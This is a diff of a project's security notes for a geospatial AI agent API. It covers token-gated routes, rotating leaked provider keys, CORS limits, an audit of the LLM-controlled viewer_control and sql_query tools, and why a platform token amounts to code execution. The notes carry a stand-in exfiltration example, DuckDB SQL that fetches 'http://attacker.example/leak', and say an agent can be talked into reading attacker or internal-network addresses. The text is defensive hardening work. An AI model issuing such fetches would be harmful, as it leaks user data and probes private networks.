@@ -25,7 +25,7 @@ The contract in both directions:
 - `POST /tools/{name}` with `{"args": {...}}` runs the tool **in the geolang process** and returns `{"result": "<string>"}`. Validation errors and exceptions come back as `200` with a ❌ result so the agent can recover. The routes are sync `def`, so FastAPI runs them in its threadpool, tools block for minutes.
 - `POST /runs` on sibyl takes `{"system_prompt", "message"}` and streams NDJSON events (`text`, `tool_call`, `tool_return`, `error`, `done`). `agent_event_stream` normalises those into the `(kind, payload)` tuples the AG-UI renderer consumes.
 
-With `PLATFORM_JWT_SECRET` set, every route that runs code, writes a file, or reads back a session or a user's data requires a live HS256 platform token and answers `401` otherwise. `/health`, the `GET /tools` manifest, the static viewer, reading a share by id and reading a live layer by its token stay open. Unset, all of it is open.
+`PLATFORM_JWT_SECRET` is required to start. With it, every route that runs code, writes a file, or reads back a session or a user's data requires a live HS256 platform token and answers `401` otherwise. `/health`, the `GET /tools` manifest, the static viewer, reading a share by id and reading a live layer by its token stay open. `GEOLANG_ALLOW_UNAUTHENTICATED=1` opens all of it, and is the only way to get there.
 
 There is no tool sandbox any more. A tool runs with the API's privileges, in its process, against the bind-mounted repo.
 
@@ -33,20 +33,23 @@ There is no tool sandbox any more. A tool runs with the API's privileges, in its
 
 `XAI_API_KEY` and `OPENAI_API_KEY` were committed as literals and are still in the git history. Treat them as leaked and rotate them at the provider console. Compose reads them from `.env` now. A `gitleaks` pre-commit hook would stop the next one.
 
-## 🔴 Tighten CORS for any non-dev deployment
+## ✅ Tighten CORS for any non-dev deployment (done 2026-08)
 
-[`server.py`](../src/api/server.py) currently sets `allow_origins=["*"]`. Fine for `localhost` development. Before any internet-reachable deployment, the allow list must be narrowed to the actual ViewTopia / dashboard origins. Move the value to an env var (`CORS_ORIGINS`) with the wildcard as the dev default.
+`cors_origins()` in [`server.py`](../src/api/server.py) reads `CORS_ORIGINS` as a comma-separated list. With `PLATFORM_JWT_SECRET` set the variable is required and `*` is refused, so a gated deployment cannot serve a wildcard to credentialed requests. The wildcard survives only under `GEOLANG_ALLOW_UNAUTHENTICATED`, which is the standalone stack.
 
-## 🔴 Audit the `viewer_control` and `sql_query` tool surface
+## ✅ Audit the `viewer_control` and `sql_query` tool surface (done 2026-08)
 
-Both let the LLM hand the browser arbitrary instructions. DuckDB-WASM is sandboxed in a Web Worker, but malicious SQL can still:
+`viewer_control`'s `action` is a `Literal` closed over what viewtopia's command registry implements, `sql_query` is not among them, actions that need coordinates or a url are refused without them, and `url` must be `http` or `https`. Verified on the viewtopia side that a command url only ever reaches `fetch()` and `Cesium3DTileset.fromUrl()`, never the DOM, so the scheme check is the whole exposure.
 
-- `read_parquet('http://attacker.example/leak')` — DuckDB-WASM's HTTP fetcher inherits the page's CORS posture.
-- Hammer arbitrary internal endpoints if the viewer is run on a corporate network.
+`/mcp` no longer offers `sql_query` at all, so what is left is the `/chat` path, where the SQL's author and the browser running it are the same person. A tool module declares itself with `TOOL_RUNS_CALLER_CODE = True` and the MCP endpoint drops it from both the manifest and the call path.
 
-**Plan:** lock down acceptable `viewer_control` actions to an enum; for `sql_query` consider an opt-in allowlist of domains that DuckDB may fetch from (configured at the viewer side, not the agent).
+Still open, and viewer-side rather than here: DuckDB-WASM will fetch any domain the SQL names, so a `/chat` user's own agent can be talked into reading `http://attacker.example/leak` or an address on their corporate network. An allowlist of fetchable domains belongs in the viewer.
 
-`/mcp` no longer offers `sql_query` at all, so what is left here is the `/chat` path, where the SQL's author and the browser running it are the same person. A tool module declares itself with `TOOL_RUNS_CALLER_CODE = True` and the MCP endpoint drops it from both the manifest and the call path.
+## A platform token is equivalent to code execution here
+
+Not a defect to fix, a boundary to state. Tools run in the API process with its privileges and no sandbox, and the escape hatches are what makes the agent useful: `geopandas_api` takes a pandas `query` expression, `pyqgis_api` and `run_qgis_algorithm` take algorithm parameters, and every tool reads and writes under `outputs/` and `user_data/`. Hardening `filter_query`'s grammar was considered and rejected: it would narrow one expression parser while leaving the surface it sits on unchanged, and buy the illusion that a token holder is contained.
+
+So the token is the security boundary and the only one. It should be scoped short, never committed, and rotated like an SSH key. Anything that hands one out, or accepts one from further away, is worth the same scrutiny as handing out shell access. A real sandbox is the precondition for a hosted deployment where callers are not already trusted.
 
 ## 🟡 Decide what to do with `core/qgis_engine.py`
 
